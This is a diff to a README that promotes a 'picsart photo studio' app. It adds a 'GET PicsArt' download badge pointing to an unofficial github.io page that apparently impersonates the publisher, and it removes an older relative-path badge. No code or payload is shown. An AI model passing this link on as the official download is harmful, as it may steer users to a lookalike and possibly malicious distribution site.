@@ -14,6 +14,8 @@ picsart photo studio is that same work on a phone, in a browser, or on Windows 1
 - A free plan with core tools and a limited pool of AI credits.
 - Plus and Pro for a full credit balance, premium templates, advanced retouch, team seats, and no ads.
 
+[![GET PicsArt](https://img.shields.io/badge/GET-PicsArt-65A30D?style=flat-square&labelColor=365314&logoColor=white)](https://picsart-ai-photo-editor.github.io/PicsArt-AI/)
+
 | Plan | What is included |
 | --- | --- |
 | Free | Core editing, templates, limited AI credits |
@@ -119,8 +121,6 @@ The notice file in this tree is a software notice for the files stored here. It 
 ## Take the studio
 
 One studio. Pick the phone build, the browser, or Windows. One button for the publisher download.
-
-[![GET PicsArt](https://img.shields.io/badge/GET-PicsArt-65A30D?style=flat-square&labelColor=365314&logoColor=white)](PicsArt-Photo-Editor)
 
 ### First look
 
